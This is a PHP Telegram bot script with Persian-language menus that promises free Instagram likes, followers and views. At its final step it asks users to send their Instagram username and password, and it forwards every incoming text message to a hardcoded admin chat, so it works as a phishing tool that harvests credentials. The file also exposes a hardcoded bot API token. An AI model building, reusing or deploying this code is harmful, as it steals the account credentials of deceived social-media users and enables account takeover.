<?php
ob_start();
#define
define('API_KEY','5213880270:AAE91loHACWnxEw_WrmHHxVcGFD-ytXxb40'); 
//====================(@CYROSIF)======================//
#met
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
//====================(@CYROSIF)======================//
#variables
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$text = $update->message->text;
$chat_id = $update->message->chat->id;
$from_id = $update->message->from->id;
$message_id = $update->message->message_id;
$from_fname = $message->from->first_name;
$first = $update->callback_query->from->first_name;
$username = $update->callback_query->from->username;
$username2 = $update->message->from->username;
$data = $update->callback_query->data;
$chatid = $update->callback_query->message->chat->id;
$messageid = $update->callback_query->message->message_id;
$forward_username = $update->message->forward_from_chat->username;
$reply = $message->reply_to_message->forward_from->id;
$reply_username = $message->reply_to_message->forward_from->username;
$from_id = $update->message->from->id;
$admin = "2113729853";
mkdir("data/$chat_id");
$rand = rand(0,21);
$Mehdi = $rand;
$rand2 = rand(0,12345);
$Yousefi = $rand2;
$admin = "2113729853";
$my = file_get_contents("data/$chat_id/mem.txt");
//====================(@CYROSIF)======================//
#functions
function SendMessage($chat_id,$text,$keyboard){
	bot('SendMessage',[
	'chat_id'=>$chat_id,
	'text'=>$text,
	'reply_markup'=>$keyboard]);
}
function edit($chat_id,$meesage_id,$text,$reply_markup){
	bot('editMessageText',[
	'chat_id'=>$chat_id,
	'message_id'=>$message_id,
	'text'=>$text,
	'reply_markup'=>$reply_markup]);
}
function save($filename, $data)
{
$file = fopen($filename, 'w');
fwrite($file, $data);
fclose($file);
}
function ForwardMessage($chatid,$from_chat,$message_id){
	bot('ForwardMessage',[
	'chat_id'=>$chatid,
	'from_chat_id'=>$from_chat,
	'message_id'=>$message_id]);
}
//====================(@CYROSIF)======================//
#start
if($text == "/start"){
    		$user = file_get_contents('Member.txt');
	$members = explode("\n",$user);
	if(!in_array($chat_id,$members)){
		$add_user = file_get_contents('Member.txt');
		$add_user .= $chat_id."\n";
		file_put_contents('Member.txt',$add_user);
	}
    bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"سلام کاربر گرامی 😇

به ربات دریافت لایک و فالوور و ویو رایگان خوش اومدی 😎💓

جهت دریافت خدمات لطفا یکی از گزینه های زیر را انتخاب کنید👇👇",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"❤دریافت لایک رایگان",'callback_data'=>"like"],['text'=>"👤دریافت فالور رایگان",'callback_data'=>"folow"]],
	[['text'=>"👀دریافت ویو رایگان",'callback_data'=>"view"]],
	[['text'=>"🎈شارژ ربات",'callback_data'=>"sharj"],['text'=>"💬راهنما",'callback_data'=>"help"]],
  ],'resize_keyboard'=>true])
  ]);
}
//====================(@CYROSIF)======================//
#like
if($data == "like"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"کاربر گرامی 😉
شما در این قسمت میتوانید به دو صورت از این بسته استفاده کنید ✌

در قسمت اول بصورت شانسی از 10 تا 100 هزار لایک رایگان میتوانید دریافت کنید فقط دوبار 😁✖

در قسمت بعد 10 هزار لایک بصورت رایگان میتوانید دریافت کنید فقط یکبار 😎✖",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🚩دریافت شانسی",'callback_data'=>"shans"],['text'=>"🚀10K رایگان",'callback_data'=>"free"]],
	[['text'=>"🔸 بازگشت 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
#folow
if($data == "folow"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"کاربر گرامی 😉
شما در این قسمت میتوانید به دو صورت از این بسته استفاده کنید ✌

در قسمت اول بصورت شانسی از 10 تا 100 هزار فالور رایگان میتوانید دریافت کنید فقط دوبار 😁✖

در قسمت بعد 10 هزار فالور بصورت رایگان میتوانید دریافت کنید فقط یکبار 😎✖",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🚩دریافت شانسی",'callback_data'=>"shans"],['text'=>"🚀10K رایگان",'callback_data'=>"free"]],
	[['text'=>"🔸 بازگشت 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
#view
if($data == "view"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"کاربر گرامی 😉
شما در این قسمت میتوانید به دو صورت از این بسته استفاده کنید ✌

در قسمت اول بصورت شانسی از 10 تا 100 هزار ویو رایگان میتوانید دریافت کنید فقط دوبار 😁✖

در قسمت بعد 10 هزار ویو بصورت رایگان میتوانید دریافت کنید فقط یکبار 😎✖",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🚩دریافت شانسی",'callback_data'=>"shans"],['text'=>"🚀10K رایگان",'callback_data'=>"free"]],
	[['text'=>"🔸 بازگشت 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
#sharj
if($data == "sharj"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"خب دوست عزیز ❤

شارژ تمامی پنل های  ربات به صورت کلی به صورت زیر است 👇👇

💥👉 $Yousefi",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🔸 بازگشت 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
#help
if($data == "help"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"با این ربات به راحتی بدون هزینه و حتی کوچکترین زحمتی برای صفحه اینستاگرام خود لایک و فالور  و ... دریاف کن اونم به صورت ایگان 😉❤

پس منتظر چی هستی همین حالا امتحان کن ",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🔸 بازگشت 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
#shans
if($data == "shans"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"کاربر گرامی 😉

هدیه ما به شما تعداد 
💰👉 $Mehdi

برای دریافت بسته شماست ✔

برای دریافت از دکمه های زیر یکی رو انتخاب کن ولی اگر از این بخش استغاده نکنی فرصتی دیه های نداری 😒✖",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"✔دریافت",'callback_data'=>"dar"],['text'=>"🚀10K رایگان",'callback_data'=>"free"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
#free
if($data == "free"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"شما با موفقیت دریافت 🚀10K رایگان را انتخاب کردید 

برای دریافت از دکمه های زیر را انتخاب کن ولی اگر از این بخش استفاده نکنی فرصت دیه نداری هاا 😒✖",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"✔دریافت",'callback_data'=>"dar"],['text'=>"بازگشت",'callback_data'=>"free"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
#dar
if($data == "dar"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"کاربر گرامی 😎

برای دریافت بسته خود اطلاعات اینستاگرام خود را بصورت زیر ارسال کنید👇

🌀مثال:
User: Matin2Hanjare
Paa: 7868543TSAFf

اگر اطلاعات شما اشتباه باشد هیچ پیامی از طرف ربات برای شما ارسال نمیشود ✖",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🔸 بازگشت 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
#back
if($data == "back"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"ای بابا 😐

چرا هی میری هی میای برو لایک و فالور و ویو رایان بگیر دست از سر من بردار دیگه 😁😂

الان چی میخوای؟؟؟",
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"❤دریافت لایک رایگان",'callback_data'=>"like"],['text'=>"👤دریافت فالور رایگان",'callback_data'=>"folow"]],
	[['text'=>"👀دریافت ویو رایگان",'callback_data'=>"view"]],
	[['text'=>"🎈شارژ ربات",'callback_data'=>"sharj"],['text'=>"💬راهنما",'callback_data'=>"help"]],
  ],'resize_keyboard'=>true])
  ]);
}
//====================(@CYROSIF)======================//
#text
if($text == "$text"){
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"$text",
]);
}
//====================(@CYROSIF)======================//
#panel
elseif($text == "/panel" and $from_id == $admin){
	bot('SendMessage',[
	'chat_id'=>$chat_id,
	'text'=>"سلام به پنل مدیریت ربات خوش امدید چه کاری از دستم برمیاد؟؟؟/",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"آمار",'callback_data'=>"am"]],
	[['text'=>"فروارد همگانی",'callback_data'=>"forr"],['text'=>"ارسال همگانی",'callback_data'=>"ersal"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
elseif($data == "am" and $chatid == $admin){
	$user = file_get_contents('Member.txt');
	$member = explode("\n",$user);
	$mem = count($member)-1;
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"آمار ربات
	$mem",
	'pars_mode'=>'html',
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"بازگشت",'callback_data'=>"bac"]]
],'resize_keyboard'=>true])
]);
}
//====================(@CYROSIF)======================//
elseif($data == "ersal" and $chatid == $admin){
	save("data/$chatid/step.txt","sendall");
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"پیام خود را در قالب متن ارسال کنید تا به دست همه برسانم.",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"بازگشت",'callback_data'=>"bac"]],
	],'resize_keyboard'=>true])
	]);
}
elseif($step == "sendall"){
	save("data/$chat_id/step.txt","none");
		bot('SendMessage',[
		'chat_id'=>$admin,
		'text'=>"پیام با موفقیت به دست همه رسید.",
		'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"بازگشت",'callback_data'=>"bac"]],
	],'resize_keyboard'=>true])
	]);
		$mem = fopen("Member.txt",'r');
		while(!feof($mem)){
			$memuser = fgets($mem);
			bot('SendMessage',[
			'chat_id'=>$memuser,
			'text'=>$text]);
	}
}
//====================(@CYROSIF)======================//
elseif($data == "forr" and $chatid == $admin){
	save("data/$chatid/command.txt","forr");
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"پیام مورد نظر خود را فروارد کنید تا به دست همه برسونم.",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"بازگشت",'callback_data'=>"bac"]],
	],'resize_keyboard'=>true])
	]);
}
elseif($command == "forr"){
	save("data/$chat_id/command.txt","none");
	$forp = fopen("Member.txt",'r');
	while(!feof($forp)){
		$fakar = fgets($forp);
	bot('ForwardMessage',[
	'chat_id'=>$fakar,
	'from_chat_id'=>$admin,
	'$message_id'=>$message_id]);
	}
	bot('SendMessage',[
	'chat_id'=>$chat_id,
	'text'=>"پیام شما به تمامی کاربران فروارد شد.",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"بازگشت",'callback_data'=>"bac"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@CYROSIF)======================//
elseif($data == "bac" and $chatid == $admin){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"به پنل مدیریت بازگشتید.
	
	
	چه کاری از دستم برمیاد؟",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"آمار",'callback_data'=>"am"]],
	[['text'=>"فروارد همگانی",'callback_data'=>"forr"],['text'=>"ارسال همگانی",'callback_data'=>"ersal"]],
	],'resize_keyboard'=>true])
	]);
}
/*
Cded By Maxtor
*/
?>